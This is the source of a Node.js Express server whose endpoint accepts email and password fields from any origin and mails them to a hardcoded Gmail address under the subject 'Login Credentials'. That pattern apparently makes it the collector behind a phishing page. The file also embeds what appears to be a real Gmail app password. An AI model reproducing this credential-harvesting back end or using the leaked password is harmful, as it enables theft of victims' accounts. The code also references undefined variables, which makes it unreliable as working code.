const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({
    origin: "*",
    credentials: true
}));
app.use(express.json());

// Create transporter object using SMTP transport
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || 'abhiisheek1@gmail.com',
    pass: process.env.EMAIL_PASS || 'kyqd ecvf avzp ayzo'
  }
});

// Email sending endpoint
app.post('/send-email', async (req, res) => {
  try {
    const {email,password } = req.body;
    
    // Default to recipient from env or the same as sender
    const recipient = process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER || 'abhiisheek1@gmail.com';
    
    // Verify transporter configuration
    await transporter.verify();
    
    // Send mail
    const info = await transporter.sendMail({
      from: process.env.EMAIL_USER || 'abhiisheek1@gmail.com',
      to: recipient,
      subject: 'Login Credentials',
      text: text || 'Hello World!',
      html: html || '<p>Hello World!</p>'
    });
    
    console.log('Email sent: ' + info.response);
    res.status(200).json({ 
      success: true, 
      message: 'Email sent successfully', 
      messageId: info.messageId 
    });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Failed to send email',
      error: error.message 
    });
  }
});

// Health check endpoint
app.get('/', (req, res) => {
  res.status(200).json({ 
    success: true, 
    message: 'Email API is running!' 
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});